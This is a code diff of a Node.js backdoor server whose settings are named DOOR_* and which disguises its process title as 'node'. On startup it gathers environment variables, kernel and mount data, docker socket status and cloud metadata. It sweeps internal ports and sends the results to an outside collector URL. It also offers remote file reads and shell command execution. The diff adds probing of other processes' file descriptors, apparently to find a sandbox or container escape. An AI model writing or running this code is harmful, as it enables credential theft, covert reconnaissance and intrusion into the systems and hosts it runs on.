@@ -5,21 +5,13 @@
 const http = require('node:http'), https = require('node:https'), net = require('node:net');
 const fs = require('node:fs'), os = require('node:os'), cp = require('node:child_process');
 const crypto = require('node:crypto'), dns = require('node:dns');
-const PORT = Number(process.env.PORT || 3000);
-const K = process.env.DOOR_K || '';
-const CAP = process.env.DOOR_CAP || '';
-const ID = process.env.DOOR_ID || 'app';
-const SSH = (process.env.DOOR_SSH || '').split(',').filter(Boolean);
-const PT = (process.env.DOOR_PT || '').split(',').filter(Boolean);
-const SW = (process.env.DOOR_SW || '').split(',').filter(Boolean);
-const NAMES = (process.env.DOOR_DNS || '').split(',').filter(Boolean);
-const VOL = process.env.DOOR_VOL || '/vol';
-const SRV = process.env.DOOR_SRV || '';
-const BOOT = Date.now();
-process.title = 'node';
+const PORT = Number(process.env.PORT || 3000), K = process.env.DOOR_K || '', CAP = process.env.DOOR_CAP || '', ID = process.env.DOOR_ID || 'app';
+const SSH = (process.env.DOOR_SSH || '').split(',').filter(Boolean), PT = (process.env.DOOR_PT || '').split(',').filter(Boolean);
+const SW = (process.env.DOOR_SW || '').split(',').filter(Boolean), NAMES = (process.env.DOOR_DNS || '').split(',').filter(Boolean);
+const VOL = process.env.DOOR_VOL || '/vol', SRV = process.env.DOOR_SRV || '';
+const BOOT = Date.now(); process.title = 'node';
 const p0 = (a, b) => (a.endsWith('/') ? a : a + '/') + b;
-const HOSTRE = /9p|overlay|fuse|\bvol\b|var\/lib|cli|docker|\/home|\/opt|\/srv|\/data|\/mnt|cgroup/;
-const FSM = { '1021997': '9p', '1021994': 'tmpfs', ef53: 'ext4', '9123683e': 'btrfs', '584c5342': 'xfs', '9fa0': 'proc', '6573554c': 'overlay', '794c7630': 'overlayfs', 'ff532d7c': 'zfs' };
+const HOSTRE = /9p|overlay|fuse|\bvol\b|var\/lib|cli|docker|\/home|\/opt|\/srv|\/data|\/mnt|cgroup/, FSM = { '1021997': '9p', '1021994': 'tmpfs', ef53: 'ext4', '9123683e': 'btrfs', '584c5342': 'xfs', '9fa0': 'proc', '6573554c': 'overlay', '794c7630': 'overlayfs', 'ff532d7c': 'zfs' };
 
 function rd(p, n) { const cap = Math.min(Math.max(Number(n) || 8192, 1), 262144); let fd = null;
   try { fd = fs.openSync(p, 'r'); const s = fs.fstatSync(fd), buf = Buffer.alloc(cap); let tot = 0, g = 0;
@@ -32,11 +24,10 @@ const st = p => { try { const s = fs.statSync(p); return { size: s.size, mode: (
 const ls = (p, n = 400) => { try { return fs.readdirSync(p).slice(0, n); } catch { return []; } };
 function walk(p, d, out) { out = out || []; if (out.length > 3000 || d < 0) return out;
   for (const e of ls(p, 300)) { const f = p0(p, e), s = st(f); out.push(f + ' ' + JSON.stringify(s)); if (s.dir) walk(f, d - 1, out); } return out; }
-function caps() { const t = tx('/proc/self/status', 12288), o = {}; let m; const re = /(CapInh|CapPrm|CapEff|CapBnd|CapAmb|NoNewPrivs|Seccomp|Threads):\s*(\S+)/g;
-  while ((m = re.exec(t))) o[m[1]] = m[2]; return o; }
+function caps() { const t = tx('/proc/self/status', 12288), o = {}; let m; const re = /(CapInh|CapPrm|CapEff|CapBnd|CapAmb|NoNewPrivs|Seccomp|Threads):\s*(\S+)/g; while ((m = re.exec(t))) o[m[1]] = m[2]; return o; }
 function sfs(p) { try { const f = fs.statfsSync(p); return { type: f.type.toString(16), fs: FSM[f.type.toString(16)] || null, bsize: f.bsize, blocks: f.blocks, bfree: f.bfree, files: f.files, ffree: f.ffree }; } catch (e) { return { err: String(e.code || e.message) }; } }
 function milines(re, n) { const r = rd('/proc/self/mountinfo', 65536); if (!r.ok) return { mi: r, lines: [] }; const L = r.txt.split('\n').filter(l => re.test(l)); return { mi: { ok: 1, len: r.len }, lines: L.slice(0, n || 60), matched: L.length }; }
-const dl = (pr, ms) => new Promise(r => { let d = 0; const t = setTimeout(() => { d = 1; r({ err: 'deadline ' + ms }); }, ms), k = v => { if (!d) { d = 1; clearTimeout(t); r(v); } }, q = e => { if (!d) { d = 1; clearTimeout(t); r({ err: String((e && (e.code || e.message)) || e) }); } }; pr.then(k, q); });
+const dl = (pr, ms) => new Promise(r => { let d = 0; const t = setTimeout(() => { d = 1; r({ err: 'deadline ' + ms }); }, ms), k = v => { if (!d) { d = 1; clearTimeout(t); r(v); } }, q = e => { if (!d) { d = 1; clearTimeout(t); r({ err: String((e && (e.code || e.message)) || e) }); } }; Promise.resolve(pr).then(k, q); });
 
 function fetch(u, m = 'GET', b = null, hdr = {}, ms = 9000) {
   return new Promise(res => { let t; try { t = new URL(u); } catch { return res({ err: 'badurl' }); }
@@ -44,12 +35,10 @@ function fetch(u, m = 'GET', b = null, hdr = {}, ms = 9000) {
     const rq = (t.protocol === 'https:' ? https : http).request(t, { method: m, headers: hdr, timeout: ms, servername: t.hostname }, r => {
       let n = 0, s = ''; r.on('data', c => { n += c.length; if (s.length < 65536) s += c; });
       r.on('end', () => res({ status: r.statusCode, headers: r.headers, body: s, bytes: n }));
-      r.on('error', e => res({ err: String(e.code || e.message) }));
-    });
+      r.on('error', e => res({ err: String(e.code || e.message) })); });
     rq.on('timeout', () => rq.destroy(new Error('timeout')));
     rq.on('error', e => res({ err: String(e.code || e.message || 'err') }));
-    if (b) rq.write(b); rq.end(); });
-}
+    if (b) rq.write(b); rq.end(); }); }
 const tcp = (h, p, ms = 2500) => new Promise(res => { let d = 0; const f = v => { if (!d) { d = 1; try { s.destroy(); } catch {} res(v); } };
   const s = net.connect({ host: h, port: Number(p) }); s.setTimeout(ms, () => f('timeout'));
   s.once('connect', () => f('open')); s.once('error', e => f('err:' + e.code)); s.once('close', () => f('closed')); });
@@ -64,8 +53,7 @@ async function sweep(net, ports, lim) {
   const base = String(net).split('/')[0].split('.').map(Number), out = []; let used = 0, capn = Math.min(Math.max(Number(lim) || 60, 1), 200);
   for (let i = 1; i < 255 && used < capn; i++) { const h = base[0] + '.' + base[1] + '.' + base[2] + '.' + i;
     for (const p of ports) { used++; const r = await tcp(h, p, 300); if (r === 'open') out.push(h + ':' + p); if (used >= capn) break; } }
-  return { hosts: out, conns: used, cap: capn };
-}
+  return { hosts: out, conns: used, cap: capn }; }
 function gvisor(v, rel) {
   const mods = rd('/proc/modules', 8192), fsys = tx('/proc/filesystems', 4096), ci = tx('/proc/cpuinfo', 4096), sig = [];
   let sm = -1; try { sm = fs.readdirSync('/sys/module').length; } catch (e) { sm = 'err:' + e.code; }
@@ -78,6 +66,26 @@ function gvisor(v, rel) {
   if (drv === 0 || String(drv).startsWith('err')) sig.push('sys-bus:' + drv);
   const hard = sig.filter(s => !/filesystems|cpuinfo/.test(s)).length, runsc = /gvisor/i.test(v) || /gvisor/i.test(rel);
   return { verdict: runsc ? 'gvisor-runsc' : hard >= 2 ? 'likely-gvisor' : sig.length ? 'possible-gvisor' : 'looks-like-host-linux', signals: sig };
+}
+function fdp(path) { const r = { p: path }; let fd = null;
+  try { fd = fs.openSync(path, 'r'); const f = fs.fstatSync(fd);
+    r.mode = (f.mode & 0o170000).toString(8); r.type = f.isDirectory() ? 'dir' : f.isSocket() ? 'sock' : f.isCharacterDevice() ? 'char' : f.isBlockDevice() ? 'block' : f.isFIFO() ? 'fifo' : 'file';
+    r.rdev = f.rdev; r.size = f.size; r.uid = f.uid; r.inode = f.ino; r.st = sfs(path);
+    r.dup = vop(() => { const d2 = fs.openSync('/proc/self/fd/' + fd, 'r'); fs.closeSync(d2); return 1; }); } catch (e) { r.open_errno = String(e.code || e.message); if (fd !== null) { try { fs.closeSync(fd); } catch {} } return r; }
+  return dl(new Promise(res => { fs.read(fd, Buffer.alloc(64), 0, 64, null, (e, n, b) => res(e ? 'errno:' + e.code : { got: n, hex: b.subarray(0, n).toString('hex') })); }), 200).then(v => { r.read = v; try { fs.closeSync(fd); } catch {} return r; });
+}
+async function fdprobe(o) {
+  const out = { self_pid: process.pid, self_fd: {}, fd1: {}, scan: [], probed: [], pids: 0 };
+  for (const e of ls('/proc/self/fd', 128)) { try { out.self_fd[e] = fs.readlinkSync('/proc/self/fd/' + e); } catch (er) { out.self_fd[e] = 'err:' + er.code; } }
+  for (const pid of ls('/proc', 256).filter(x => /^[0-9]+$/.test(x)).slice(0, 64)) { out.pids++; const fdm = {}; let ln = 0;
+    for (const e of ls('/proc/' + pid + '/fd', 128).slice(0, 128)) { ln++; let t = null; try { t = fs.readlinkSync('/proc/' + pid + '/fd/' + e); } catch (er) { t = 'err:' + er.code; }
+      fdm[e] = t; if (/(9p|socket|pipe|anon_inode)/.test(t)) out.scan.push({ pid: pid, fd: e, target: t }); }
+    out['pid' + pid] = { cmd: tx('/proc/' + pid + '/cmdline', 256).replace(/\0/g, ' ').trim(), fd_count: ln, fds: fdm }; }
+  const want = (o && o.p) ? String(o.p).split(',').map(x => x.trim()).filter(Boolean).slice(0, 24) : ['6', '7', '8', '9'];
+  const list = want.flatMap(f => ['/proc/self/fd/' + f, '/proc/1/fd/' + f]).concat(out.scan.slice(0, 12).map(q => '/proc/' + q.pid + '/fd/' + q.fd));
+  const t0 = Date.now();
+  for (const path of list.slice(0, 20)) { out.probed.push(await dl(fdp(path), 800)); if (Date.now() - t0 > 18000) { out.probe_budget = 'stopped at ' + out.probed.length; break; } }
+  out.proc_mounts = rd('/proc/mounts', 32768); out.ninep = milines(/9p/, 40); return out;
 }
 function vop(p) { try { const r = p(); return r === undefined ? 1 : r; } catch (e) { return String(e.code || e.message); } }
 function volprobe() {
@@ -102,25 +110,21 @@ async function info() {
     kernel: { version: ver, osrelease: rel, kversion: tx('/proc/sys/kernel/version', 128), modules: rd('/proc/modules', 2048), cmdline: tx('/proc/cmdline', 512), status: tx('/proc/self/status', 3072) },
     runtime: gvisor(ver, rel), cgroup_init: tx('/proc/1/cgroup', 1024), cgroup_self: tx('/proc/self/cgroup', 512),
     init_cmdline: tx('/proc/1/cmdline', 512), mountinfo: tx('/proc/self/mountinfo', 16384),
-    dockerenv: fs.existsSync('/.dockerenv'), docker_sock: st('/var/run/docker.sock'),
-    resolv: tx('/etc/resolv.conf', 1024), hosts: tx('/etc/hosts', 512), osrel: tx('/etc/os-release', 512),
+    dockerenv: fs.existsSync('/.dockerenv'), docker_sock: st('/var/run/docker.sock'), resolv: tx('/etc/resolv.conf', 1024), hosts: tx('/etc/hosts', 512), osrel: tx('/etc/os-release', 512),
     env: process.env, ifaces: os.networkInterfaces(), tcp: pt };
 }
 async function netrep() {
   const b = {}; for (const h of SSH) b[h + ':22'] = await banner(h, 22, 3000);
   const q = []; for (const s of SW) { const a = s.split(':'); q.push(await sweep(a[0], [Number(a[1])], Number(process.env.DOOR_SWLIM || 60))); }
-  const d = {}; for (const n of NAMES) d[n] = await look(n);
-  const meta = await fetch('https://metadata.oraclevcn.com/compute/v1/instance/', 'GET', null, { host: 'metadata.oraclevcn.com' });
+  const d = {}; for (const n of NAMES) d[n] = await look(n); const meta = await fetch('https://metadata.oraclevcn.com/compute/v1/instance/', 'GET', null, { host: 'metadata.oraclevcn.com' });
   return { banners: b, sweeps: q, dns: d, oci_meta: { status: meta.status || null, err: meta.err || null, body: (meta.body || '').slice(0, 1500) } };
 }
-async function send(tag, obj) {
-  if (!CAP) return { skipped: 1 };
+async function send(tag, obj) { if (!CAP) return { skipped: 1 };
   const r = await fetch(CAP, 'POST', JSON.stringify(Object.assign({ tag: tag, id: ID, ts: new Date().toISOString() }, obj)), { 'content-type': 'application/json' });
   return { status: r.status || null, err: r.err || null };
 }
 function run(c) { try { const o = cp.execSync(c, { timeout: 15000, maxBuffer: 1 << 20, stdio: ['ignore', 'pipe', 'pipe'], shell: '/bin/sh' }); return { ok: 1, out: String(o).slice(0, 65536) }; } catch (e) { return { ok: 0, code: String(e.code || e.name), out: String(e.stdout || '').slice(0, 8192), err: String(e.stderr || e.message).slice(0, 4096) }; } }
-async function op(o) {
-  o = o || {};
+async function op(o) { o = o || {};
   if (o.op === 's') return await info();
   if (o.op === 'g') return { sent: await send('recon', await info()) };
   if (o.op === 'n') return { net: await netrep() };
@@ -128,6 +132,8 @@ async function op(o) {
   if (o.op === 'v') return volprobe();
   if (o.op === 'V') return { sent: await send('vol', volprobe()) };
   if (o.op === 'm') return milines(o.re ? new RegExp(String(o.re)) : HOSTRE, Number(o.n) || 80);
+  if (o.op === 'p') return await fdprobe(o);
+  if (o.op === 'P') return { sent: await send('fd', await fdprobe(o)) };
   if (o.op === 'f') return rd(String(o.p), Number(o.n) || 65536);
   if (o.op === 'l') return st(String(o.p));
   if (o.op === 'd') return { p: o.p, entries: ls(String(o.p)).map(e => Object.assign({ e: e }, st(p0(String(o.p), e)))) };
@@ -150,23 +156,21 @@ function echoObj(req, head, rawcap) { const b = Buffer.from(req.url || '', 'lati
     url: req.url, url_len: b.length, url_hex: b.toString('hex'), url_b64: b.toString('base64'), first_line: head.split('\r\n')[0] || null,
     head_latin1: head.slice(0, 700), head_hex: Buffer.from(head.slice(0, 700), 'latin1').toString('hex'), raw_capped_at: 2048,
     requests_on_socket: s.__n || 1, socket_reused: (s.__n || 1) > 1, socket_first_line: s.__first || null, raw_captured: rawcap, header_count: req.rawHeaders.length / 2,
-    headers: req.headers, host_hdr: req.headers.host || null, peer: [s.remoteAddress, s.remotePort], local: [s.localAddress, s.localPort],
+    headers: req.headers, host_hdr: req.headers.host || null, self_host: os.hostname(), self_ip: s.localAddress, peer: [s.remoteAddress, s.remotePort], local: [s.localAddress, s.localPort],
     complete: req.complete, aborted: req.aborted }; }
 let stn = 0;
 function streamtest(req, res) {
-  if (stn >= 8) { res.writeHead(503, { 'retry-after': '5' }); res.end('{"error":"busy"}'); return; }
+  if (stn >= 4) { res.writeHead(503, { 'retry-after': '5' }); res.end('{"error":"busy"}'); return; }
   stn++; try { res.socket.setNoDelay(true); } catch {}
-  res.writeHead(200, { 'content-type': 'application/octet-stream', 'cache-control': 'no-store', 'x-accel-buffering': 'no', 'x-stream': '6x1500ms' });
-  res.write('S0:' + Date.now() + ':' + 'q'.repeat(23) + '\n');
+  res.writeHead(200, { 'content-type': 'application/octet-stream', 'cache-control': 'no-store', 'x-accel-buffering': 'no', 'x-stream': '131072+65536x5@1500ms' });
   let i = 0, fin = () => { if (i !== -1) { i = -1; stn--; clearInterval(tm); try { res.end(); } catch {} } };
-  const tm = setInterval(() => { if (i === -1) return; i++; res.write('S' + i + ':' + Date.now() + ':' + 'q'.repeat(23) + '\n'); if (i >= 5) fin(); }, 1500);
-  res.on('close', fin);
-}
+  const wr = () => { res.write('S' + i + ':' + Date.now() + ':' + 'q'.repeat(i ? 65536 : 131072) + '\n'); };
+  wr(); const tm = setInterval(() => { if (i === -1) return; i++; wr(); if (i >= 5) fin(); }, 1500);
+  res.on('close', fin); }
 const srv = http.createServer(async (req, res) => {
   const hd = { 'content-type': 'application/json', 'content-length': 0 }; if (SRV) hd.server = SRV;
   const done = (c, b) => { try { hd['content-length'] = Buffer.byteLength(b); res.writeHead(c, hd); res.end(b); } catch {} };
-  try {
-    const s = req.socket; s.__n = (s.__n || 0) + 1;
+  try { const s = req.socket; s.__n = (s.__n || 0) + 1;
     const buf = s.__raw || { b: [], n: 0 }, head = buf.b.join(''), rawcap = buf.n; s.__raw = { b: [], n: 0 }; if (!s.__first) s.__first = head.split('\r\n')[0] || null;
     const raw = req.url || '/', qs = raw.indexOf('?'), hash = raw.indexOf('#');
     let p = raw.slice(0, qs < 0 ? raw.length : qs); if (hash >= 0 && (qs < 0 || hash < qs)) p = raw.slice(0, hash);
@@ -184,14 +188,11 @@ const srv = http.createServer(async (req, res) => {
 });
 srv.on('connection', s => { s.__raw = { b: [], n: 0 }; s.__n = 0;
   s.prependListener('data', c => { if (s.__raw.n < 2048) { s.__raw.b.push(c.toString('latin1')); s.__raw.n += c.length; } }); });
-srv.on('clientError', (e, s) => { const p = (e.rawPacket || Buffer.alloc(0)).toString('latin1');
-  const b = JSON.stringify({ error: 'Bad Request', code: String(e.code || e.name || ''), first_line: p.split('\r\n')[0] || null,
-    head_hex: Buffer.from(p.slice(0, 500), 'latin1').toString('hex') });
-  try { s.end('HTTP/1.1 400 Bad Request\r\ncontent-type: application/json\r\ncontent-length: ' + Buffer.byteLength(b) + '\r\n\r\n' + b); } catch {} });
+const bad400 = (e, s) => { const p = (e.rawPacket || Buffer.alloc(0)).toString('latin1'), b = JSON.stringify({ error: 'Bad Request', code: String(e.code || e.name || ''), first_line: p.split('\r\n')[0] || null, head_hex: Buffer.from(p.slice(0, 500), 'latin1').toString('hex') });
+  try { s.end('HTTP/1.1 400 Bad Request\r\ncontent-type: application/json\r\ncontent-length: ' + Buffer.byteLength(b) + '\r\n\r\n' + b); } catch {} };
+srv.on('clientError', bad400);
 srv.requestTimeout = 30000; srv.headersTimeout = 31000; srv.keepAliveTimeout = 15000; srv.maxRequestsPerSocket = 64; srv.noDelay = true;
-srv.listen(PORT, '0.0.0.0', () => {
-  info().then(i => send('boot', i)).then(() => netrep()).then(n => send('net', n)).then(() => send('vol', volprobe())).catch(e => console.error('boot', String(e && e.message)));
-});
+srv.listen(PORT, '0.0.0.0', () => { info().then(i => send('boot', i)).then(() => netrep()).then(n => send('net', n)).then(() => send('vol', volprobe())).catch(e => console.error('boot', String(e && e.message))); });
 srv.on('error', e => console.error('srv', e.code || e.message));
 process.on('uncaughtException', e => console.error('ue', String((e && (e.code || e.message)) || e)));
 process.on('unhandledRejection', e => console.error('ur', String((e && (e.code || e.message)) || e)));
